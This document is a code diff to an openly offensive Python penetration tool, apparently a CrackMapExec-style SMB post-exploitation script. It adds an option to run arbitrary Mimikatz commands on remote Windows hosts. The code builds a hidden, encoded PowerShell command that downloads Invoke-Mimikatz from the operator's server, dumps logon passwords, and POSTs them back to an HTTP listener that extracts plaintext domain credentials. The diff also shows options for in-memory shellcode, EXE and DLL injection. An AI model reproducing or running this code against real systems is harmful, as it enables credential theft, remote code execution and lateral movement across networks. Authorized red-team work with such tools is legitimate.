@@ -206,20 +206,24 @@ class MimikatzServer(BaseHTTPRequestHandler):
         length = int(self.headers.getheader('content-length'))
         data = self.rfile.read(length)
 
-        buf = StringIO.StringIO(data).readlines()
-        i = 0
-        while i < len(buf):
-            if ('Password' in buf[i]) and ('(null)' not in buf[i]):
-                passw  = buf[i].split(':')[1].strip()
-                domain = buf[i-1].split(':')[1].strip()
-                user   = buf[i-2].split(':')[1].strip()
-                print_succ('{} Found plain text creds! Domain: {} Username: {} Password: {}'.format(self.client_address[0], yellow(domain), yellow(user), yellow(passw)))
-            i += 1
+        if args.mimikatz:
+            buf = StringIO.StringIO(data).readlines()
+            i = 0
+            while i < len(buf):
+                if ('Password' in buf[i]) and ('(null)' not in buf[i]):
+                    passw  = buf[i].split(':')[1].strip()
+                    domain = buf[i-1].split(':')[1].strip()
+                    user   = buf[i-2].split(':')[1].strip()
+                    print_succ('{} Found plain text creds! Domain: {} Username: {} Password: {}'.format(self.client_address[0], yellow(domain), yellow(user), yellow(passw)))
+                i += 1
 
-        credsfile_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))
-        with open('logs/' + credsfile_name, 'w') as creds:
+        elif args.mimi_cmd:
+            print data
+
+        log_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))
+        with open('logs/' + log_name, 'w') as creds:
             creds.write(data)
-        print_status("{} Saved POST data to {}".format(self.client_address[0], yellow(credsfile_name)))
+        print_status("{} Saved POST data to {}".format(self.client_address[0], yellow(log_name)))
 
 class SMBServer(Thread):
     def __init__(self):
@@ -2359,11 +2363,11 @@ def _listShares(smb):
 
     return permissions
 
-def ps_command(command=None, katz_ip=None):
+def ps_command(command=None, katz_ip=None, katz_command='privilege::debug sekurlsa::logonpasswords exit'):
     if katz_ip:
         command = """
         IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Invoke-Mimikatz.ps1');
-        $creds = Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords exit";
+        $creds = Invoke-Mimikatz -Command "{katz_command}";
         $request = [System.Net.WebRequest]::Create('http://{addr}');
         $request.Method = "POST";
         $request.ContentType = "application/x-www-form-urlencoded";
@@ -2373,7 +2377,7 @@ def ps_command(command=None, katz_ip=None):
         $requestStream.Write( $bytes, 0, $bytes.Length );
         $requestStream.Close();
         $request.GetResponse();
-        """.format(addr=katz_ip)
+        """.format(addr=katz_ip, katz_command=katz_command)
 
     return b64encode(command.encode('UTF-16LE'))
 
@@ -2557,6 +2561,10 @@ def connect(host):
                 noOutput = True
                 args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(katz_ip=local_ip))
 
+            if args.mimi_cmd:
+                noOutput = True
+                args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(katz_ip=local_ip, katz_command=args.mimi_cmd))
+
             if args.pscommand:
                 args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(command=args.pscommand))
 
@@ -2687,8 +2695,9 @@ if __name__ == '__main__':
     cgroup.add_argument('--execm', choices={"wmi", "smbexec", "atexec"}, default="smbexec", help="Method to execute the command (default: smbexec)")
     cgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute the specified command")
     cgroup.add_argument("-X", metavar="PS_COMMAND", dest='pscommand', help='Excute the specified powershell command')
+    cgroup.add_argument("-M", metavar='MIMIKATZ_CMD', dest='mimi_cmd', help='Run Invoke-Mimikatz with the specified command')
 
-    xgroup = parser.add_argument_group("Shellcode/EXE/DLL injection", "Options for injecting Shellcode/EXE/DLL's using PowerShell")
+    xgroup = parser.add_argument_group("Shellcode/EXE/DLL injection", "Options for injecting Shellcode/EXE/DLL's in memory using PowerShell")
     xgroup.add_argument("--inject", choices={'shellcode', 'exe', 'dll'}, help='Inject Shellcode, EXE or a DLL')
     xgroup.add_argument("--path", type=str, help='Path to the Shellcode/EXE/DLL you want to inject on the target systems')
     xgroup.add_argument('--procid', type=int, help='Process ID to inject the Shellcode/EXE/DLL into (if omitted, will inject within the running PowerShell process)')
@@ -2762,7 +2771,7 @@ if __name__ == '__main__':
 
         args.pattern = patterns
 
-    if args.mimikatz or args.inject or (args.ntds == 'ninja'):
+    if args.mimikatz or args.mimi_cmd or args.inject or (args.ntds == 'ninja'):
         print_status("Press CTRL-C at any time to exit")
         print_status('Note: This might take some time on large networks! Go grab a redbull!\n')
 
